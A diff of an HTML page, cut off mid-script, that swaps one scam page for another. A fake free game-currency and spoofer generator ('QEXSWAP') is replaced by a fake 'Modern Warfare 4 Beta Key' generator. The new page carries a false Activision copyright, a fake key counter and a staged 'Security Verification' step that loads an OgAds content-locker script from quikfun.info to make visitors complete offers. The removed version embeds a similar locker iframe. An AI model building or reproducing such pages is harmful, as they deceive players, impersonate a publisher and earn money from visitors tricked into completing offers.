@@ -3,429 +3,369 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QEXSWAP - Premium Game Resources</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>Call of Duty: Modern Warfare 4 - Early Beta Access</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
-        body { background-color: #0b0c0f; color: white; font-family: 'Inter', sans-serif; margin: 0; min-height: 100vh; overflow-x: hidden; }
-        .glass { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08); backdrop-filter: blur(10px); }
-        .game-header-card { position: relative; overflow: hidden; border-radius: 2rem; background: #111; border: 1px solid rgba(255, 255, 255, 0.1); }
-        .bg-blur-image { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-size: cover; background-position: center; filter: blur(30px) brightness(0.3); z-index: 0; transform: scale(1.2); }
-        .header-content { position: relative; z-index: 1; padding: 3rem 1rem; }
-        .status-badge { background: rgba(34, 197, 94, 0.1); border: 1px solid rgba(34, 197, 94, 0.2); color: #22c55e; padding: 6px 16px; border-radius: 9999px; font-size: 10px; font-weight: 900; display: inline-flex; align-items: center; gap: 8px; }
-        .btn-blue { background: linear-gradient(90deg, #1d4ed8, #3b82f6); transition: 0.2s; box-shadow: 0 4px 15px rgba(29, 78, 216, 0.3); }
-        .btn-blue:active { transform: scale(0.98); }
-        .flag-icon { width: 20px; height: 14px; border-radius: 2px; object-fit: cover; }
-        .game-card:hover { transform: translateY(-5px); border-color: #3b82f6; transition: 0.3s; background: rgba(59, 130, 246, 0.05); }
-        .terminal-log { font-family: 'Courier New', Courier, monospace; color: #3b82f6; font-size: 11px; line-height: 1.6; }
-        .progress-bar-bg { background: rgba(255, 255, 255, 0.05); border-radius: 999px; height: 8px; overflow: hidden; }
-        .progress-bar-fill { background: #3b82f6; height: 100%; width: 0%; transition: width 0.3s ease; box-shadow: 0 0 10px #3b82f6; }
-        .resource-select { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 1.2rem; padding: 20px; transition: 0.3s; }
-        .resource-select:hover { border-color: rgba(59, 130, 246, 0.3); }
-        select { background: transparent; border: none; color: white; width: 100%; outline: none; font-weight: 900; cursor: pointer; font-size: 1.2rem; }
-        option { background: #0b0c0f; color: white; }
-        .paste-btn { background: rgba(59, 130, 246, 0.1); border: 1px solid rgba(59, 130, 246, 0.2); color: #3b82f6; font-size: 10px; font-weight: 900; transition: 0.2s;}
-        .paste-btn:hover { background: rgba(59, 130, 246, 0.2); }
-        .res-icon { width: 32px; height: 32px; object-fit: contain; filter: drop-shadow(0px 2px 4px rgba(0,0,0,0.5)); }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #0b0e14;
+            color: #ffffff;
+            background-image: linear-gradient(rgba(11, 14, 20, 0.85), rgba(11, 14, 20, 0.95)), url('https://images.unsplash.com/photo-1542751371-adc38448a05e?auto=format&fit=crop&w=1350&q=80');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        header {
+            width: 100%;
+            padding: 20px;
+            text-align: center;
+            background: rgba(16, 22, 32, 0.9);
+            border-bottom: 3px solid #ff4e00;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+
+        header h1 {
+            font-size: 1.8rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #ff4e00;
+            text-shadow: 0 0 10px rgba(255, 78, 0, 0.5);
+        }
+
+        header span {
+            color: #fff;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 90%;
+            margin: 40px auto;
+            background: rgba(16, 22, 32, 0.95);
+            border: 1px solid #2a3447;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
+            text-align: center;
+        }
+
+        h2 {
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        p.subtitle {
+            color: #94a3b8;
+            font-size: 0.95rem;
+            margin-bottom: 25px;
+        }
+
+        .status-box {
+            display: flex;
+            justify-content: space-around;
+            background: rgba(255, 78, 0, 0.1);
+            border: 1px dashed #ff4e00;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 25px;
+            font-size: 0.9rem;
+        }
+
+        .status-item span {
+            font-weight: bold;
+            color: #ff4e00;
+        }
+
+        .step-title {
+            font-size: 1.1rem;
+            margin-bottom: 15px;
+            color: #ff4e00;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+
+        .platform-selector {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .platform-btn {
+            background: #1e293b;
+            border: 2px solid #334155;
+            color: white;
+            padding: 15px 10px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            font-size: 0.9rem;
+        }
+
+        .platform-btn:hover {
+            border-color: #ff4e00;
+            background: #2a3447;
+        }
+
+        .platform-btn.active {
+            background: #ff4e00;
+            border-color: #ff4e00;
+            box-shadow: 0 0 15px rgba(255, 78, 0, 0.4);
+        }
+
+        .action-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #ff4e00, #ec4899);
+            color: white;
+            border: none;
+            padding: 18px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border-radius: 6px;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(255, 78, 0, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .action-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(255, 78, 0, 0.6);
+        }
+
+        /* Generator Animation Area */
+        .generator-console {
+            display: none;
+            background: #020617;
+            border: 1px solid #1e293b;
+            border-radius: 6px;
+            padding: 20px;
+            margin-top: 20px;
+            text-align: left;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.85rem;
+            color: #38bdf8;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .console-log {
+            margin-bottom: 8px;
+            line-height: 1.4;
+        }
+
+        .progress-container {
+            display: none;
+            width: 100%;
+            background-color: #1e293b;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 12px;
+            background: linear-gradient(90deg, #ff4e00, #38bdf8);
+            box-shadow: 0 0 10px rgba(56, 189, 248, 0.5);
+            transition: width 0.1s linear;
+        }
+
+        /* Overlay / Locker Call Trigger Style */
+        .verification-box {
+            display: none;
+            background: rgba(30, 41, 59, 0.5);
+            border: 2px solid #f43f5e;
+            border-radius: 6px;
+            padding: 20px;
+            margin-top: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(244, 63, 94, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(244, 63, 94, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(244, 63, 94, 0); }
+        }
+
+        .verification-box h3 {
+            color: #f43f5e;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+
+        .verify-btn {
+            background: #f43f5e;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 1rem;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 15px;
+            text-transform: uppercase;
+        }
+
+        /* Force OgAds links to be white */
+        .og_offers a, #og_offers a, .offer-list a, .og-offer-text { 
+            color: #ffffff !important; 
+            text-decoration: none !important; 
+        }
         
-        /* Spoofer Checkbox Styles */
-        .spoofer-check { accent-color: #3b82f6; width: 1.2rem; height: 1.2rem; cursor: pointer; }
-        .pack-btn { border: 1px solid rgba(255,255,255,0.1); transition: 0.2s; }
-        .pack-btn.active { border-color: #3b82f6; background: rgba(59, 130, 246, 0.1); }
-        
-        /* Modal Styles */
-        .modal-bg { background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(8px); }
+        footer {
+            margin-top: auto;
+            width: 100%;
+            padding: 20px;
+            text-align: center;
+            background: #090d12;
+            color: #475569;
+            font-size: 0.8rem;
+            border-top: 1px solid #1e293b;
+        }
     </style>
+
+    <!-- OGADS LOCKER SCRIPT -->
+    <script type="text/javascript" id="ogjs" src="https://quikfun.info/cl/js/o4epoq"></script>
 </head>
 <body>
 
-    <header class="p-4 glass sticky top-0 z-[100] border-b border-white/5">
-        <div class="max-w-7xl mx-auto flex justify-between items-center px-4">
-            <div class="text-2xl font-black cursor-pointer tracking-tighter" onclick="showLibrary()">QEX<span class="text-blue-500">SWAP</span></div>
-            <div class="flex items-center gap-5 text-zinc-500"><i class="fa fa-moon"></i></div>
-        </div>
+    <header>
+        <h1>Modern Warfare <span>IV</span> Beta Access</h1>
     </header>
 
-    <section id="library-section" class="max-w-7xl mx-auto px-6 py-12">
-        <div class="mb-12 text-center">
-            <h1 class="text-5xl md:text-6xl font-black mb-6 uppercase tracking-tighter">Premium Resources.<br><span class="text-blue-500">Zero Limits.</span></h1>
-            <div class="relative max-w-2xl mx-auto">
-                <i class="fa fa-search absolute left-5 top-4 text-zinc-500"></i>
-                <input type="text" id="search-input" placeholder="Search games and apps..." class="w-full bg-zinc-900 border border-zinc-800 rounded-full py-4 px-14 text-sm focus:outline-none focus:border-blue-500 transition-all">
-            </div>
-        </div>
-        <div id="games-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4"></div>
-    </section>
+    <div class="container">
+        <h2>Leaked Early Access Portal</h2>
+        <p class="subtitle">Get your official Activision Beta Key to download and play MW4 before the global release.</p>
 
-    <section id="generator-section" class="max-w-7xl mx-auto px-6 py-8 hidden">
-        <div class="mb-6">
-            <button onclick="showLibrary()" class="text-zinc-500 text-xs font-bold uppercase flex items-center gap-2 hover:text-white transition-colors">
-                <i class="fa fa-chevron-left text-[8px]"></i> Back to Library
-            </button>
+        <div class="status-box">
+            <div class="status-item">Status: <span>ONLINE</span></div>
+            <div class="status-item">Keys Left: <span id="keys-count">142</span></div>
+            <div class="status-item">Rating: <span>4.9/5</span></div>
         </div>
 
-        <div class="flex flex-col lg:flex-row gap-8">
-            <div class="flex-1 space-y-6">
-                <div class="game-header-card">
-                    <div id="bg-image-dynamic" class="bg-blur-image"></div>
-                    <div class="header-content text-center">
-                        <div class="relative inline-block mb-4">
-                            <img id="gen-icon" src="" class="w-24 h-24 rounded-2xl border border-white/10 shadow-2xl relative z-10 object-cover">
-                            <div class="absolute -right-2 -bottom-2 w-7 h-7 bg-green-500 rounded-full border-4 border-[#0b0c0f] z-20 flex items-center justify-center">
-                                <div class="w-2 h-2 bg-white rounded-full animate-pulse"></div>
-                            </div>
-                        </div>
-                        <h2 id="gen-title" class="text-3xl font-black uppercase tracking-tighter">Game Hack</h2>
-                        <div class="status-badge mt-4 uppercase">SYSTEM ONLINE • <span id="active-users">348</span> ACTIVE USERS</div>
-                    </div>
-                </div>
-
-                <div class="glass rounded-[2rem] p-8 lg:p-12" id="gen-input-step">
-                    <div class="flex justify-between items-center mb-10">
-                        <div class="flex items-center gap-3 text-blue-500 font-black uppercase text-[10px] tracking-widest">
-                            <span class="w-6 h-6 rounded-full border border-blue-500 flex items-center justify-center">1</span> Connection
-                        </div>
-                        <a href="#" class="text-blue-500 text-[10px] font-black uppercase hover:underline tracking-widest">How To Find User ID?</a>
-                    </div>
-                    <div class="space-y-6">
-                        <div class="relative flex items-center">
-                            <i class="fa fa-user absolute left-4 text-zinc-500"></i>
-                            <input type="text" id="username" placeholder="Enter Your User ID" class="w-full bg-zinc-900 border border-white/5 rounded-xl py-5 pl-12 pr-28 outline-none focus:border-blue-500 font-bold transition-all">
-                            <button onclick="handlePaste()" class="absolute right-2 px-4 py-2 rounded-lg paste-btn flex items-center gap-2 uppercase tracking-widest">
-                                <i class="fa fa-paste"></i> Paste
-                            </button>
-                        </div>
-                        <div class="grid grid-cols-3 gap-3">
-                            <button class="platform-btn p-4 glass rounded-xl flex flex-col items-center gap-2 hover:border-blue-500 transition-all border-blue-500 bg-blue-500/10 text-blue-500" onclick="selectPlatform(this)"><i class="fab fa-apple text-xl"></i><span class="text-[9px] font-bold uppercase">iOS</span></button>
-                            <button class="platform-btn p-4 glass rounded-xl flex flex-col items-center gap-2 hover:border-blue-500 transition-all" onclick="selectPlatform(this)"><i class="fab fa-android text-xl"></i><span class="text-[9px] font-bold uppercase">Android</span></button>
-                            <button class="platform-btn p-4 glass rounded-xl flex flex-col items-center gap-2 hover:border-blue-500 transition-all" onclick="selectPlatform(this)"><i class="fa fa-desktop text-xl"></i><span class="text-[9px] font-bold uppercase">Other</span></button>
-                        </div>
-                        <button onclick="goToResources()" class="w-full btn-blue py-5 rounded-2xl font-black text-sm uppercase tracking-widest mt-4">Connect to Server</button>
-                    </div>
-                </div>
-
-                <div class="glass rounded-[2rem] p-8 lg:p-12 hidden" id="gen-resource-step">
-                    <div class="flex justify-between items-center mb-8">
-                        <div class="flex items-center gap-3 text-blue-500 font-black uppercase text-[10px] tracking-widest">
-                            <span class="w-6 h-6 rounded-full border border-blue-500 flex items-center justify-center">2</span> Selection
-                        </div>
-                    </div>
-                    
-                    <div class="flex items-center gap-3 p-4 mb-8 bg-green-500/5 border border-green-500/20 rounded-2xl">
-                        <i class="fa fa-check-circle text-green-500"></i>
-                        <div class="text-[10px] font-black uppercase tracking-widest text-green-500">Connected: <span id="display-user" class="text-white ml-2">Username</span></div>
-                    </div>
-
-                    <div id="standard-layout">
-                        <div class="mb-6 flex items-center gap-2 text-xs font-black uppercase tracking-widest text-zinc-400">
-                            <i class="fa fa-cube text-blue-500"></i> Select Resources
-                        </div>
-                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-8">
-                            <div class="resource-select">
-                                <div class="flex items-center gap-3 mb-4">
-                                    <img src="" id="res-icon-1" class="res-icon">
-                                    <span class="text-[10px] font-black uppercase text-zinc-500 tracking-widest" id="res-label-1">Resources 1</span>
-                                </div>
-                                <select id="res-val-1">
-                                    <option value="10000">10,000</option><option value="50000">50,000</option><option value="99999">99,999</option>
-                                </select>
-                            </div>
-                            <div class="resource-select">
-                                <div class="flex items-center gap-3 mb-4">
-                                    <img src="" id="res-icon-2" class="res-icon">
-                                    <span class="text-[10px] font-black uppercase text-zinc-500 tracking-widest" id="res-label-2">Resources 2</span>
-                                </div>
-                                <select id="res-val-2">
-                                    <option value="50000">50,000</option><option value="250000">250,000</option><option value="999999">999,999</option>
-                                </select>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div id="spoofer-layout" class="hidden">
-                        <div class="mb-6 flex items-center gap-2 text-xs font-black uppercase tracking-widest text-zinc-400">
-                            <i class="fa fa-microchip text-blue-500"></i> Select Spoofer Package
-                        </div>
-                        <div class="grid grid-cols-2 gap-4 mb-6">
-                            <div class="glass p-5 rounded-2xl cursor-pointer pack-btn" onclick="togglePack(this)">
-                                <h4 class="font-black text-sm mb-1"><i class="fa fa-crown text-blue-500 mr-1"></i> Full Edition</h4>
-                                <p class="text-[9px] text-zinc-500 font-bold uppercase tracking-widest">All Features</p>
-                            </div>
-                            <div class="glass p-5 rounded-2xl cursor-pointer pack-btn active" onclick="togglePack(this)">
-                                <h4 class="font-black text-sm mb-1"><i class="fa fa-sliders-h text-blue-500 mr-1"></i> Custom Edition</h4>
-                                <p class="text-[9px] text-zinc-500 font-bold uppercase tracking-widest">Select Modules</p>
-                            </div>
-                        </div>
-                        <div class="grid grid-cols-1 md:grid-cols-2 gap-3 mb-8">
-                            <label class="flex items-center gap-4 p-4 glass rounded-xl cursor-pointer hover:border-blue-500 transition-colors">
-                                <input type="checkbox" checked class="spoofer-check"><div><h5 class="text-xs font-bold">GPS Spoofing</h5><p class="text-[9px] text-zinc-500">Teleport instantly</p></div>
-                            </label>
-                            <label class="flex items-center gap-4 p-4 glass rounded-xl cursor-pointer hover:border-blue-500 transition-colors">
-                                <input type="checkbox" checked class="spoofer-check"><div><h5 class="text-xs font-bold">Virtual Joystick</h5><p class="text-[9px] text-zinc-500">On-screen movement</p></div>
-                            </label>
-                            <label class="flex items-center gap-4 p-4 glass rounded-xl cursor-pointer hover:border-blue-500 transition-colors">
-                                <input type="checkbox" checked class="spoofer-check"><div><h5 class="text-xs font-bold">Anti-Ban Shield v2</h5><p class="text-[9px] text-zinc-500">Max account protection</p></div>
-                            </label>
-                            <label class="flex items-center gap-4 p-4 glass rounded-xl cursor-pointer hover:border-blue-500 transition-colors">
-                                <input type="checkbox" class="spoofer-check"><div><h5 class="text-xs font-bold">Auto Walk Routes</h5><p class="text-[9px] text-zinc-500">Automated GPX walking</p></div>
-                            </label>
-                            <label class="flex items-center gap-4 p-4 glass rounded-xl cursor-pointer hover:border-blue-500 transition-colors">
-                                <input type="checkbox" class="spoofer-check"><div><h5 class="text-xs font-bold">Cooldown Timer</h5><p class="text-[9px] text-zinc-500">Built-in calculator</p></div>
-                            </label>
-                            <label class="flex items-center gap-4 p-4 glass rounded-xl cursor-pointer hover:border-blue-500 transition-colors">
-                                <input type="checkbox" class="spoofer-check"><div><h5 class="text-xs font-bold">Auto PokeStop</h5><p class="text-[9px] text-zinc-500">Automatic spinning</p></div>
-                            </label>
-                            <label class="flex items-center gap-4 p-4 glass rounded-xl cursor-pointer hover:border-blue-500 transition-colors">
-                                <input type="checkbox" class="spoofer-check"><div><h5 class="text-xs font-bold">IV Checker</h5><p class="text-[9px] text-zinc-500">Real-time IV display</p></div>
-                            </label>
-                            <label class="flex items-center gap-4 p-4 glass rounded-xl cursor-pointer hover:border-blue-500 transition-colors">
-                                <input type="checkbox" class="spoofer-check"><div><h5 class="text-xs font-bold">Enhanced Throw</h5><p class="text-[9px] text-zinc-500">Perfect throws every time</p></div>
-                            </label>
-                        </div>
-                    </div>
-
-                    <button onclick="startHackProcess()" class="w-full btn-blue py-5 rounded-2xl font-black text-sm uppercase tracking-widest">Generate</button>
-                </div>
-
-                <div class="glass rounded-[2rem] p-8 lg:p-12 hidden" id="gen-loading-step">
-                    <div class="flex items-center gap-3 mb-8 text-blue-500 font-black uppercase text-[10px] tracking-widest">
-                        <span class="w-6 h-6 rounded-full border border-blue-500 flex items-center justify-center"><i class="fa fa-spinner fa-spin text-xs"></i></span> Processing
-                    </div>
-                    <div class="terminal-log space-y-2 mb-6" id="terminal-output"></div>
-                    <div class="progress-bar-bg"><div class="progress-bar-fill" id="p-bar"></div></div>
-                </div>
-
-                <div class="glass rounded-[2rem] p-10 hidden text-center" id="gen-verify-step">
-                    <i class="fa fa-shield-alt text-blue-500 text-5xl mb-6"></i>
-                    <h2 class="text-2xl font-black mb-4 uppercase tracking-tighter">Verification Required</h2>
-                    <p class="text-zinc-500 text-sm mb-8 px-8">Due to high traffic, please complete the manual verification step to release your items to your account.</p>
-                    <button onclick="showLocker()" class="w-full bg-green-600 hover:bg-green-500 py-5 rounded-2xl font-black text-sm uppercase tracking-widest transition-colors shadow-lg shadow-green-900/20">Verify Now</button>
-                </div>
-
-                <div class="glass rounded-[2rem] p-10">
-                    <h3 class="text-xl font-black mb-4 uppercase"><span id="guide-name">Game</span> - Complete Guide</h3>
-                    <p class="text-zinc-500 text-sm leading-relaxed">Our advanced cloud injection technology for <span id="guide-game">this game</span> ensures your account remains 100% safe. No files are modified locally. 256-bit SSL active.</p>
-                </div>
+        <div id="setup-area">
+            <div class="step-title">1. Select Your Platform</div>
+            <div class="platform-selector">
+                <button class="platform-btn active" onclick="selectPlatform(this, 'PC')">PC / BNET</button>
+                <button class="platform-btn" onclick="selectPlatform(this, 'PS5')">PS5</button>
+                <button class="platform-btn" onclick="selectPlatform(this, 'XBOX')">XBOX</button>
             </div>
 
-            <aside class="w-full lg:w-80 space-y-4">
-                <div class="glass rounded-2xl p-6">
-                    <h4 class="text-[10px] font-black uppercase text-zinc-400 mb-6 flex items-center gap-2 border-b border-white/5 pb-3 tracking-widest">
-                        <i class="fa fa-globe text-blue-500"></i> Global Activity
-                    </h4>
-                    <div id="sidebar-logs" class="space-y-5"></div>
-                </div>
-                <div class="bg-green-600/5 border border-green-600/20 p-6 rounded-2xl">
-                    <h5 class="font-black text-[10px] mb-2 text-green-500 uppercase tracking-widest">Instant Delivery</h5>
-                    <p class="text-zinc-400 text-[10px] leading-relaxed">Resources are injected into your UID in under 5 minutes.</p>
-                </div>
-                <div class="bg-blue-600/5 border border-blue-600/20 p-6 rounded-2xl">
-                    <h5 class="font-black text-[10px] mb-2 text-blue-500 uppercase tracking-widest">Safe & Anonymous</h5>
-                    <p class="text-zinc-400 text-[10px] leading-relaxed">Encrypted cloud tunnel. No jailbreak or root required.</p>
-                </div>
-            </aside>
+            <button class="action-btn" onclick="startGeneration()">Generate Beta Key</button>
         </div>
-    </section>
 
-    <div id="cpa-locker-modal" class="fixed inset-0 z-[9999] hidden flex items-center justify-center modal-bg px-4">
-        <div class="w-full max-w-2xl h-[85vh] bg-[#111] rounded-3xl overflow-hidden border border-white/10 relative shadow-2xl flex flex-col">
-            <div class="bg-[#1a1c23] p-4 flex justify-between items-center border-b border-white/5">
-                <div class="flex items-center gap-2">
-                    <i class="fa fa-lock text-green-500"></i>
-                    <span class="font-black text-sm uppercase tracking-widest">Human Verification</span>
-                </div>
-                <button onclick="document.getElementById('cpa-locker-modal').classList.add('hidden')" class="text-zinc-500 hover:text-white transition-colors w-8 h-8 flex items-center justify-center rounded-full bg-black/50">
-                    <i class="fa fa-times"></i>
-                </button>
-            </div>
-            <iframe src="https://quikfun.info/cl/i/qnnw94" class="w-full flex-1 border-none bg-white"></iframe>
+        <!-- Animation Elements -->
+        <div class="progress-container" id="progress-container">
+            <div class="progress-bar" id="progress-bar"></div>
+        </div>
+
+        <div class="generator-console" id="generator-console"></div>
+
+        <!-- Content Locker Redirection Trigger -->
+        <div class="verification-box" id="verification-box">
+            <h3>Security Verification Required</h3>
+            <p style="font-size: 0.9rem; color: #cbd5e1;">Due to extremely high demand and bot abuse, you must manually verify your request to release your MW4 Beta Key.</p>
+            <p style="font-size: 0.85rem; color: #ff4e00; margin-top: 8px; font-weight: bold;">Complete 1 free secure task below to unlock your code!</p>
+            <button class="verify-btn" onclick="callOgadsLocker()">Verify Now</button>
         </div>
     </div>
 
+    <footer>
+        <p>&copy; 2026 Activision Publishing, Inc. Promotional key hub. All trademarks belong to their respective owners.</p>
+    </footer>
+
     <script>
-        // Array of 16 Games with all exact image URLs provided
-        const gamesData = [
-            { name: 'Delta Executor', sub: 'Import Latest Scripts', img: 'https://upload.wikimedia.org/wikipedia/commons/c/ce/Delta_Executor_Fivicon.jpg', rating: '4.8', r1: 'Scripts', r2: 'Credits', i1: 'https://cdn-icons-png.flaticon.com/512/2620/2620686.png', i2: 'https://cdn-icons-png.flaticon.com/512/2586/2586171.png' },
-            { name: 'Pokemon GO', sub: 'Working Spoofer', img: 'https://m.media-amazon.com/images/M/MV5BYTJkNDRhMzAtMzVmOS00ZTE2LTllNzAtOTRiN2M2ZTA4OTI0XkEyXkFqcGc@._V1_.jpg', rating: '4.8', r1: 'PokeCoins', r2: 'Stardust', i1: 'https://cdn-icons-png.flaticon.com/512/2586/2586171.png', i2: 'https://cdn-icons-png.flaticon.com/512/118/118669.png' },
-            { name: 'Monopoly GO', sub: 'Dice Rolls & Money', img: 'https://play-lh.googleusercontent.com/W9egSskuWVXTUwDLRYQTg2TItLqL6zVQy629U_v3KvNGRiLgJXXeqXgW5_-VR50DG6qAfpR-w8cplPJczOBA=w526-h296-rw', rating: '4.9', r1: 'Dice Rolls', r2: 'Money', i1: 'https://www.tweakzen.com/asset/69df66a051733-r1-image_2026-04-15_122025508.png', i2: 'https://www.tweakzen.com/asset/69df66a051880-r2-image_2026-04-15_122040017.png' },
-            { name: 'Pocket FM', sub: 'Get Coins Instantly', img: 'https://play-lh.googleusercontent.com/kweybiMo_yZEBNmGCmh3fyRVXQQ5lIJQB4z_jaECV_tpqEW8GqhFjEFmxbtRL8TrFic', rating: '4.8', r1: 'Coins', r2: 'Credits', i1: 'https://cdn-icons-png.flaticon.com/512/2586/2586171.png', i2: 'https://cdn-icons-png.flaticon.com/512/2489/2489756.png' },
-            { name: 'Bitlife', sub: 'Unlock Free Perks', img: 'https://play-lh.googleusercontent.com/fUM-UyywXxjC8soxAZdIlxJrlRRXmql8wkE426SHzft4lJycSKVd2jCYQQX1BEG9Xw', rating: '4.8', r1: 'Money', r2: 'God Mode', i1: 'https://cdn-icons-png.flaticon.com/512/2489/2489756.png', i2: 'https://cdn-icons-png.flaticon.com/512/694/694984.png' },
-            { name: 'DLS 26', sub: 'Get Diamonds & Coins', img: 'https://play-lh.googleusercontent.com/f7DZ9TRn1gEVLP4xF0D5tTy8QB2jccsP36eJK5tMOY_q4YQ9EH7yemP9I2c7Me48_tjp_fXn3A38vOMuK1di', rating: '4.8', r1: 'Diamonds', r2: 'Coins', i1: 'https://cdn-icons-png.flaticon.com/512/754/754054.png', i2: 'https://cdn-icons-png.flaticon.com/512/2586/2586171.png' },
-            { name: 'Coin Master', sub: 'Get Spins & Coins', img: 'https://play-lh.googleusercontent.com/lja_bcS9SXsaK4x_q0rXuiqf3CIIwfy8QveRWfW5MEaAPOST_auDLuzWMyMUrBzi0sI', rating: '4.9', r1: 'Spins', r2: 'Coins', i1: 'https://www.tweakzen.com/asset/69e6413f5d5a7-r1-image_2026-04-20_170739493.png', i2: 'https://www.tweakzen.com/asset/69e6413f5d6d7-r2-image_2026-04-20_170702532.png' },
-            { name: 'Candy Crush Saga', sub: 'Gold Bars', img: 'https://play-lh.googleusercontent.com/JvMhIxuwArVmcMReJQB8PIEB1MIQNMGf9j5i914JtkBrHrA55K-nMUIVlYCa7SXAdHtzLtsycEo6NpXeHFxLwvI', rating: '4.8', r1: 'Gold Bars', r2: 'Lives', i1: 'https://cdn-icons-png.flaticon.com/512/2586/2586171.png', i2: 'https://cdn-icons-png.flaticon.com/512/833/833472.png' },
-            { name: 'Robux', sub: 'Robux Generator', img: 'https://m.media-amazon.com/images/I/21aoUPG3svL.png', rating: '4.8', r1: 'Robux', r2: 'Premium', i1: 'https://www.tweakzen.com/asset/69e63eb5bf2bb-r1-image_2026-04-20_165636489.png', i2: 'https://cdn-icons-png.flaticon.com/512/694/694984.png' },
-            { name: 'Sims Freeplay', sub: 'VIP & Resources', img: 'https://store-images.s-microsoft.com/image/apps.53697.64737940845214615.82a9a5cd-32c5-4fb1-a951-2a7b976ad460.f0e0779f-450f-421f-b0c6-7b04bf25fa60', rating: '4.9', r1: 'Simoleons', r2: 'LP Points', i1: 'https://cdn-icons-png.flaticon.com/512/2586/2586171.png', i2: 'https://cdn-icons-png.flaticon.com/512/754/754054.png' },
-            { name: 'FC Mobile 26', sub: 'Get Free FC Points', img: 'https://play-lh.googleusercontent.com/yQHb1bk88ENXLZ2_ZO-st7cuG78pva5yRAge2CjhBPoBoEng1ouxyx30vK4s4Z7553Kohd9pPVm1GC2Phs8slA', rating: '4.9', r1: 'FC Points', r2: 'Coins', i1: 'https://www.tweakzen.com/asset/69e641e9d2f5a-r1-image_2026-04-20_171021662.png', i2: 'https://cdn-icons-png.flaticon.com/512/2586/2586171.png' },
-            { name: 'Subway Surfers', sub: 'Get Free Keys & Coins', img: 'https://img.poki-cdn.com/cdn-cgi/image/q=78,scq=50,width=1200,height=1200,fit=cover,f=png/231cb237ab22763a61c2ca0eac6a3760/subway-surfers-logo.png', rating: '4.8', r1: 'Keys', r2: 'Coins', i1: 'https://www.tweakzen.com/asset/69e6429ac29d5-r1-image_2026-04-20_171237146.png', i2: 'https://www.tweakzen.com/asset/69e6429ac2bc8-r2-image_2026-04-20_171245613.png' },
-            { name: 'Blox Fruits Script', sub: 'Import Latest Scripts', img: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcREvaPZxV-nValLzlhZBPUhx2qpEQAeh6iybQ&s', rating: '4.8', r1: 'Beli', r2: 'Fragments', i1: 'https://cdn-icons-png.flaticon.com/512/2489/2489756.png', i2: 'https://cdn-icons-png.flaticon.com/512/754/754054.png' },
-            { name: 'Top Eleven', sub: 'Get Free Tokens', img: 'https://play-lh.googleusercontent.com/Wd-zv5-b2R7YDE1uCfknQLxFY21NsOW9UDimGPDSDJ9F5o_pQXyG3cYa1hieAXKeUmzkMhm04wMiqh-VZSGUNw', rating: '4.8', r1: 'Tokens', r2: 'Treatments', i1: 'https://www.tweakzen.com/asset/69f70918d5d22-r1-image_2026-05-03_103629641.png', i2: 'https://cdn-icons-png.flaticon.com/512/883/883407.png' },
-            { name: 'ReelShort', sub: 'Get Free Coins', img: 'https://static.divxland.org/wp-content/uploads/2025/04/reelshort-short-movies-tv-thumbnail.png', rating: '4.7', r1: 'Coins', r2: 'VIP', i1: 'https://cdn-icons-png.flaticon.com/512/2586/2586171.png', i2: 'https://cdn-icons-png.flaticon.com/512/694/694984.png' },
-            { name: 'Cooking Fever', sub: 'Free Coins & Gems', img: 'https://d30fyg9bwlgx48.cloudfront.net/wp-content/uploads/2022/12/game-list-img-CF-644x800__ScaleWidthWzMyMl0.jpg', rating: '4.9', r1: 'Gems', r2: 'Coins', i1: 'https://cdn-icons-png.flaticon.com/512/754/754054.png', i2: 'https://cdn-icons-png.flaticon.com/512/2586/2586171.png' }
-        ];
+        let selectedPlatform = "PC";
 
-        let selectedGame = null;
-
-        function initGrid() {
